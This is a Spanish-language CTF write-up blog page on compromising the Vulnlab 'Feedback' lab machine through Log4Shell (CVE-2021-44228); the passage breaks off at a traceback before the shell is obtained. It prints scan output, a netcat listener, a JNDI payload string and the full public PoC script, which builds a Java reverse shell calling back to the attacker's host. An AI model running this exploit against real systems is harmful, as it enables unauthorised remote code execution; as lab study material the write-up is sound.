@@ -1,0 +1,753 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Vulnlab - FeedBack | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="Vulnlab - FeedBack" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/vulnlab/machines/2024/03/22/feedback.html" />
+<meta property="og:url" content="http://localhost:4000/vulnlab/machines/2024/03/22/feedback.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-03-22T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Vulnlab - FeedBack" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-03-22T00:00:00-06:00","datePublished":"2024-03-22T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"Vulnlab - FeedBack","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/vulnlab/machines/2024/03/22/feedback.html"},"url":"http://localhost:4000/vulnlab/machines/2024/03/22/feedback.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Vulnlab - FeedBack</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-03-22T00:00:00-06:00" itemprop="datePublished">
+        Mar 22, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="/assets/vulnlab/img/machines/feedback/icon.png" />
+</p>
+
+<ul>
+  <li>En este post vamos a resolver la máquina Feedback de la plataforma de Vulnlab en la cual vamos a explotar una vulnerabilidad conocida llamada log4shell qué salió en el año 2021 que afecta a la biblioteca de registro Apache Log4j esta vulnerabilidad se va a explotar gracias a que se está utilizando un servicio web con Tomcat obtendremos RCE gracias a esta vulnerabilidad para la escalada de privilegios gracias a un archivo de configuración podremos ver la contraseña del usuario root y simplemente migraremos a ese usuario.
+    <h2 id="portscan">PortScan</h2>
+  </li>
+  <li>Comenzamos escaneando los puertos abiertos por el protocolo <strong>TCP</strong> y sus tecnologías que están corriendo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,8080 10.10.121.97 <span class="nt">-oN</span> targeted
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-23 10:33 CST
+Nmap scan report <span class="k">for </span>10.10.121.97
+Host is up <span class="o">(</span>0.16s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   2048 d7:5e:41:c7:8d:0a:68:1f:7d:cd:01:32:5d:70:09:1e <span class="o">(</span>RSA<span class="o">)</span>
+|   256 fb:95:c3:2d:d4:fb:c9:cd:25:e6:52:17:e7:dc:3c:ff <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 78:e0:8c:58:d3:01:42:82:5a:47:95:6c:72:49:36:35 <span class="o">(</span>ED25519<span class="o">)</span>
+8080/tcp open  http    Apache Tomcat 9.0.56
+|_http-favicon: Apache Tomcat
+|_http-title: Apache Tomcat/9.0.56
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h2 id="enumeracion-puerto-8080">Enumeracion puerto 8080</h2>
+
+<ul>
+  <li>Vemos que en el puerto <strong>8080</strong> está corriendo un servicio web que es <strong>Apache Tomcat 9.0.56</strong>.</li>
+</ul>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">121.97</span><span class="p">:</span><span class="mi">8080</span>
+<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">121.97</span><span class="p">:</span><span class="mi">8080</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">121.97</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">Apache</span> <span class="no">Tomcat</span><span class="o">/</span><span class="mf">9.0</span><span class="o">.</span><span class="mi">56</span><span class="p">]</span>
+</code></pre></div></div>
+
+<ul>
+  <li>De momento vemos que no hay ningún subdominio.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap curl <span class="nt">-I</span> http://10.10.121.97:8080
+HTTP/1.1 200
+Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>UTF-8
+Transfer-Encoding: chunked
+Date: Sat, 23 Mar 2024 16:36:52 GMT
+</code></pre></div></div>
+
+<ul>
+  <li>Esta es la página web:</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/jz7DNHD.png" />
+</p>
+
+<ul>
+  <li>Vamos a hacer <strong>fuzzing</strong> para descubrir nuevas rutas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.121.97:8080 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 80 <span class="nt">--no-error</span>
+<span class="o">===============================================================</span>
+Gobuster v3.6
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://10.10.121.97:8080
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 80
+<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.6
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/docs                 <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> /docs/]
+/feedback             <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> /feedback/]
+/examples             <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> /examples/]
+/manager              <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> /manager/]
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos rutas interesantes que nos reportan un <strong>302</strong>. Vamos a examinar su contenido.</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/BCKmysa.png" />
+</p>
+
+<p align="center">
+<img src="https://i.imgur.com/DJ5rxwp.png" />
+</p>
+
+<p align="center">
+<img src="https://i.imgur.com/w4gaiZ9.png" />
+</p>
+
+<h2 id="log4shell">Log4Shell</h2>
+
+<ul>
+  <li>Bueno, esta ruta ya es interesante.</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/6rmzBT2.png" />
+</p>
+
+<ul>
+  <li>Vemos que nos deja ingresar data, vamos a capturar la petición con <strong>Burpsuite</strong> para ver cómo va todo por detrás.</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/hSChmGm.png" />
+</p>
+
+<ul>
+  <li>Y aquí vemos la petición y un campo muy interesante.</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/gzI8BQn.png" />
+</p>
+
+<ul>
+  <li>Si examinamos el código fuente de la página web, vemos lo siguiente:</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/8T0nY1v.png" />
+</p>
+
+<ul>
+  <li>Vamos a explotar una vulnerabilidad muy conocida que se llama <strong>Log4Shell</strong> <a href="https://www.ibm.com/mx-es/topics/log4j">https://www.ibm.com/mx-es/topics/log4j</a> .</li>
+</ul>
+
+<blockquote>
+  <p>Log4Shell se refiere a una vulnerabilidad crítica de seguridad que afecta a Log4j, una biblioteca de registro de eventos de Java ampliamente utilizada. La vulnerabilidad, oficialmente denominada CVE-2021-44228, permite a un atacante ejecutar código arbitrario en un sistema afectado simplemente enviando un mensaje de registro especialmente diseñado. Esto puede conducir a una variedad de ataques, incluidos la ejecución remota de código, el acceso no autorizado a sistemas y datos sensibles, y el secuestro de aplicaciones.</p>
+</blockquote>
+
+<ul>
+  <li>
+    <p>Podemos usar el siguiente <strong>poc</strong> <a href="https://github.com/kozmer/log4j-shell-poc">https://github.com/kozmer/log4j-shell-poc</a> .</p>
+  </li>
+  <li>
+    <p>Algo que tenemos que hacer es descargar el <strong>JDK</strong>, ya que todo esto funciona con <strong>java</strong> <a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content git clone https://github.com/kozmer/log4j-shell-poc
+Cloning into <span class="s1">'log4j-shell-poc'</span>...
+remote: Enumerating objects: 52, <span class="k">done</span><span class="nb">.</span>
+remote: Counting objects: 100% <span class="o">(</span>12/12<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+remote: Compressing objects: 100% <span class="o">(</span>12/12<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+remote: Total 52 <span class="o">(</span>delta 0<span class="o">)</span>, reused 1 <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused 40
+Receiving objects: 100% <span class="o">(</span>52/52<span class="o">)</span>, 38.74 MiB | 1.37 MiB/s, <span class="k">done</span><span class="nb">.</span>
+Resolving deltas: 100% <span class="o">(</span>7/7<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Y listo, ahora tenemos todo correcto para comenzar con la explotación de esta vulnerabilidad.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  log4j-shell-poc git:<span class="o">(</span>main<span class="o">)</span> <span class="nb">mv</span> /home/miguel/Downloads/jdk-8u202-linux-x64.tar.gz <span class="nb">.</span>
+➜  log4j-shell-poc git:<span class="o">(</span>main<span class="o">)</span> <span class="nb">tar</span> <span class="nt">-xf</span> jdk-8u202-linux-x64.tar.gz
+➜  log4j-shell-poc git:<span class="o">(</span>main<span class="o">)</span> ./jdk1.8.0_202/bin/java <span class="nt">-version</span>
+Picked up _JAVA_OPTIONS: <span class="nt">-Dawt</span>.useSystemAAFontSettings<span class="o">=</span>on <span class="nt">-Dswing</span>.aatext<span class="o">=</span><span class="nb">true
+</span>java version <span class="s2">"1.8.0_202"</span>
+Java<span class="o">(</span>TM<span class="o">)</span> SE Runtime Environment <span class="o">(</span>build 1.8.0_202-b08<span class="o">)</span>
+Java HotSpot<span class="o">(</span>TM<span class="o">)</span> 64-Bit Server VM <span class="o">(</span>build 25.202-b08, mixed mode<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a instalar los <code class="language-plaintext highlighter-rouge">requirements.txt</code> .</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  log4j-shell-poc git:<span class="o">(</span>main<span class="o">)</span> ✗ pip <span class="nb">install</span> <span class="nt">-r</span> requirements.txt
+Defaulting to user installation because normal site-packages is not writeable
+Requirement already satisfied: colorama <span class="k">in</span> /usr/lib/python3/dist-packages <span class="o">(</span>from <span class="nt">-r</span> requirements.txt <span class="o">(</span>line 1<span class="o">))</span> <span class="o">(</span>0.4.6<span class="o">)</span>
+Collecting argparse <span class="o">(</span>from <span class="nt">-r</span> requirements.txt <span class="o">(</span>line 2<span class="o">))</span>
+  Downloading argparse-1.4.0-py2.py3-none-any.whl.metadata <span class="o">(</span>2.8 kB<span class="o">)</span>
+Downloading argparse-1.4.0-py2.py3-none-any.whl <span class="o">(</span>23 kB<span class="o">)</span>
+Installing collected packages: argparse
+Successfully installed argparse-1.4.0
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora nos vamos a poner en escucha con <strong>netcat</strong> para que nos llegue la <strong>shell</strong> .</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  log4j-shell-poc git:<span class="o">(</span>main<span class="o">)</span> ✗ <span class="nb">sudo </span>nc <span class="nt">-nvlp</span> 443
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>miguel:
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div>
+
+<ul>
+  <li>Este es el exploit que se utiliza:</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="n">argparse</span>
+<span class="kn">from</span> <span class="n">colorama</span> <span class="kn">import</span> <span class="n">Fore</span><span class="p">,</span> <span class="n">init</span>
+<span class="kn">import</span> <span class="n">subprocess</span>
+<span class="kn">import</span> <span class="n">threading</span>
+<span class="kn">from</span> <span class="n">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
+<span class="kn">import</span> <span class="n">os</span>
+<span class="kn">from</span> <span class="n">http.server</span> <span class="kn">import</span> <span class="n">HTTPServer</span><span class="p">,</span> <span class="n">SimpleHTTPRequestHandler</span>
+
+<span class="n">CUR_FOLDER</span> <span class="o">=</span> <span class="nc">Path</span><span class="p">(</span><span class="n">__file__</span><span class="p">).</span><span class="n">parent</span><span class="p">.</span><span class="nf">resolve</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">generate_payload</span><span class="p">(</span><span class="n">userip</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">lport</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
+    <span class="n">program</span> <span class="o">=</span> <span class="sh">"""</span><span class="s">
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.Socket;
+
+public class Exploit {
+
+    public Exploit() throws Exception {
+        String host=</span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s">;
+        int port=%d;
+        String cmd=</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="sh">"</span><span class="s">;
+        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+        Socket s=new Socket(host,port);
+        InputStream pi=p.getInputStream(),
+            pe=p.getErrorStream(),
+            si=s.getInputStream();
+        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+        while(!s.isClosed()) {
+            while(pi.available()&gt;0)
+                so.write(pi.read());
+            while(pe.available()&gt;0)
+                so.write(pe.read());
+            while(si.available()&gt;0)
+                po.write(si.read());
+            so.flush();
+            po.flush();
+            Thread.sleep(50);
+            try {
+                p.exitValue();
+                break;
+            }
+            catch (Exception e){
+            }
+        };
+        p.destroy();
+        s.close();
+    }
+}
+</span><span class="sh">"""</span> <span class="o">%</span> <span class="p">(</span><span class="n">userip</span><span class="p">,</span> <span class="n">lport</span><span class="p">)</span>
+
+    <span class="c1"># writing the exploit to Exploit.java file
+</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="nc">Path</span><span class="p">(</span><span class="sh">"</span><span class="s">Exploit.java</span><span class="sh">"</span><span class="p">)</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">p</span><span class="p">.</span><span class="nf">write_text</span><span class="p">(</span><span class="n">program</span><span class="p">)</span>
+        <span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">([</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">CUR_FOLDER</span><span class="p">,</span> <span class="sh">"</span><span class="s">jdk1.8.0_20/bin/javac</span><span class="sh">"</span><span class="p">),</span> <span class="nf">str</span><span class="p">(</span><span class="n">p</span><span class="p">)])</span>
+    <span class="k">except</span> <span class="nb">OSError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="n">Fore</span><span class="p">.</span><span class="n">RED</span> <span class="o">+</span> <span class="sa">f</span><span class="sh">'</span><span class="s">[-] Something went wrong </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+        <span class="k">raise</span> <span class="n">e</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="n">Fore</span><span class="p">.</span><span class="n">GREEN</span> <span class="o">+</span> <span class="sh">'</span><span class="s">[+] Exploit java class created success</span><span class="sh">'</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">payload</span><span class="p">(</span><span class="n">userip</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">webport</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">lport</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
+    <span class="nf">generate_payload</span><span class="p">(</span><span class="n">userip</span><span class="p">,</span> <span class="n">lport</span><span class="p">)</span>
+
+    <span class="nf">print</span><span class="p">(</span><span class="n">Fore</span><span class="p">.</span><span class="n">GREEN</span> <span class="o">+</span> <span class="sh">'</span><span class="s">[+] Setting up LDAP server</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
+
+    <span class="c1"># create the LDAP server on new thread
+</span>    <span class="n">t1</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">ldap_server</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">userip</span><span class="p">,</span> <span class="n">webport</span><span class="p">))</span>
+    <span class="n">t1</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
+
+    <span class="c1"># start the web server
+</span>    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Starting Webserver on port </span><span class="si">{</span><span class="n">webport</span><span class="si">}</span><span class="s"> http://0.0.0.0:</span><span class="si">{</span><span class="n">webport</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">httpd</span> <span class="o">=</span> <span class="nc">HTTPServer</span><span class="p">((</span><span class="sh">'</span><span class="s">0.0.0.0</span><span class="sh">'</span><span class="p">,</span> <span class="n">webport</span><span class="p">),</span> <span class="n">SimpleHTTPRequestHandler</span><span class="p">)</span>
+    <span class="n">httpd</span><span class="p">.</span><span class="nf">serve_forever</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">check_java</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
+    <span class="n">exit_code</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nf">call</span><span class="p">([</span>
+        <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">CUR_FOLDER</span><span class="p">,</span> <span class="sh">'</span><span class="s">jdk1.8.0_20/bin/java</span><span class="sh">'</span><span class="p">),</span>
+        <span class="sh">'</span><span class="s">-version</span><span class="sh">'</span><span class="p">,</span>
+    <span class="p">],</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">DEVNULL</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">DEVNULL</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">exit_code</span> <span class="o">==</span> <span class="mi">0</span>
+
+
+<span class="k">def</span> <span class="nf">ldap_server</span><span class="p">(</span><span class="n">userip</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">lport</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
+    <span class="n">sendme</span> <span class="o">=</span> <span class="sh">"</span><span class="s">${jndi:ldap://%s:1389/a}</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">userip</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">Fore</span><span class="p">.</span><span class="n">GREEN</span> <span class="o">+</span> <span class="sa">f</span><span class="sh">"</span><span class="s">[+] Send me: </span><span class="si">{</span><span class="n">sendme</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+
+    <span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://{}:{}/#Exploit</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">userip</span><span class="p">,</span> <span class="n">lport</span><span class="p">)</span>
+    <span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">([</span>
+        <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">CUR_FOLDER</span><span class="p">,</span> <span class="sh">"</span><span class="s">jdk1.8.0_20/bin/java</span><span class="sh">"</span><span class="p">),</span>
+        <span class="sh">"</span><span class="s">-cp</span><span class="sh">"</span><span class="p">,</span>
+        <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">CUR_FOLDER</span><span class="p">,</span> <span class="sh">"</span><span class="s">target/marshalsec-0.0.3-SNAPSHOT-all.jar</span><span class="sh">"</span><span class="p">),</span>
+        <span class="sh">"</span><span class="s">marshalsec.jndi.LDAPRefServer</span><span class="sh">"</span><span class="p">,</span>
+        <span class="n">url</span><span class="p">,</span>
+    <span class="p">])</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
+    <span class="nf">init</span><span class="p">(</span><span class="n">autoreset</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">Fore</span><span class="p">.</span><span class="n">BLUE</span> <span class="o">+</span> <span class="sh">"""</span><span class="s">
+[!] CVE: CVE-2021-44228
+[!] Github repo: https://github.com/kozmer/log4j-shell-poc
+</span><span class="sh">"""</span><span class="p">)</span>
+
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="nc">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="sh">'</span><span class="s">log4shell PoC</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--userip</span><span class="sh">'</span><span class="p">,</span>
+                        <span class="n">metavar</span><span class="o">=</span><span class="sh">'</span><span class="s">userip</span><span class="sh">'</span><span class="p">,</span>
+                        <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
+                        <span class="n">default</span><span class="o">=</span><span class="sh">'</span><span class="s">localhost</span><span class="sh">'</span><span class="p">,</span>
+                        <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Enter IP for LDAPRefServer &amp; Shell</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--webport</span><span class="sh">'</span><span class="p">,</span>
+                        <span class="n">metavar</span><span class="o">=</span><span class="sh">'</span><span class="s">webport</span><span class="sh">'</span><span class="p">,</span>
+                        <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span>
+                        <span class="n">default</span><span class="o">=</span><span class="sh">'</span><span class="s">8000</span><span class="sh">'</span><span class="p">,</span>
+                        <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">listener port for HTTP port</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--lport</span><span class="sh">'</span><span class="p">,</span>
+                        <span class="n">metavar</span><span class="o">=</span><span class="sh">'</span><span class="s">lport</span><span class="sh">'</span><span class="p">,</span>
+                        <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span>
+                        <span class="n">default</span><span class="o">=</span><span class="sh">'</span><span class="s">9001</span><span class="sh">'</span><span class="p">,</span>
+                        <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Netcat Port</span><span class="sh">'</span><span class="p">)</span>
+
+    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="nf">check_java</span><span class="p">():</span>
+            <span class="nf">print</span><span class="p">(</span><span class="n">Fore</span><span class="p">.</span><span class="n">RED</span> <span class="o">+</span> <span class="sh">'</span><span class="s">[-] Java is not installed inside the repository</span><span class="sh">'</span><span class="p">)</span>
+            <span class="k">raise</span> <span class="nc">SystemExit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="nf">payload</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">userip</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">webport</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">lport</span><span class="p">)</span>
+    <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="n">Fore</span><span class="p">.</span><span class="n">RED</span> <span class="o">+</span> <span class="sh">"</span><span class="s">user interrupted the program.</span><span class="sh">"</span><span class="p">)</span>
+        <span class="k">raise</span> <span class="nc">SystemExit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="nf">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Este es el exploit que automatiza la explotación de la vulnerabilidad <strong>Log4Shell</strong>. Genera un exploit en java y usa <strong>LDAP</strong> y <strong>HTTP</strong> para desencadenar la ejecución del exploit, el exploit de <strong>java</strong> establece una conexión con el servidor <strong>LDAP</strong> y ejecuta la <strong>shell</strong>. Vamos a seguir los pasos que nos indican.</p>
+  </li>
+  <li>
+    <p>Si les pasa este error, simplemente cambian el nombre y listo.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  log4j-shell-poc git:<span class="o">(</span>main<span class="o">)</span> ✗ python3 poc.py <span class="nt">--userip</span> 10.8.1.127 <span class="nt">--webport</span> 8000 <span class="nt">--lport</span> 443
+
+<span class="o">[!]</span> CVE: CVE-2021-44228
+<span class="o">[!]</span> Github repo: https://github.com/kozmer/log4j-shell-poc
+
+Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
